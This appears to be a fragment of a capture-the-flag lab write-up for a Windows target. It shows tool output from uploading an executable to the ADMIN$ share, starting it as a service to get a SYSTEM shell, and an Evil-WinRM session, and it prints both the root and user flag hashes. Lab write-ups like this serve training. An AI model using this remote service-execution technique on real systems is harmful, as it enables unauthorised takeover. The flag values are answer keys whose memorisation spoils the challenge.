                                                                                                                                                                                                           
[*] Requesting shares on 10.10.11.35.....                                                                                                                                                                  
[*] Found writable share ADMIN$                                                                                                                                                                            
[*] Uploading file yHoQKznf.exe                                                                                                                                                                            
[*] Opening SVCManager on 10.10.11.35.....                                                                                                                                                                 
[*] Creating service aMUU on 10.10.11.35.....                                                                                                                                                              
[*] Starting service aMUU.....                                                                                                                                                                             
[!] Press help for extra shell commands                                                                                                                                                                    
Microsoft Windows [Version 10.0.20348.2700]                                                                                                                                                                
(c) Microsoft Corporation. All rights reserved.                                                                                                                                                            
                                                                                                                                                                                                           
C:\Windows\system32> whoami                                                                                                                                                                                
nt authority\system                         
```
root flag
```bash
c:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 1B60-8905

 Directory of c:\Users\Administrator\Desktop

08/30/2024  10:06 AM    <DIR>          .
08/26/2024  01:10 PM    <DIR>          ..
10/05/2024  06:42 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)     167,018,496 bytes free

c:\Users\Administrator\Desktop> type root.txt
737d749b75c1810d9f687d81bf57e556

```

user flag
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         10/5/2024   6:43 AM          73802 program.exe
-a----         10/5/2024   6:48 AM           7168 shell.exe
-ar---         10/5/2024   6:42 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
663afcbf8cf013303f956ea506bb7d9d
```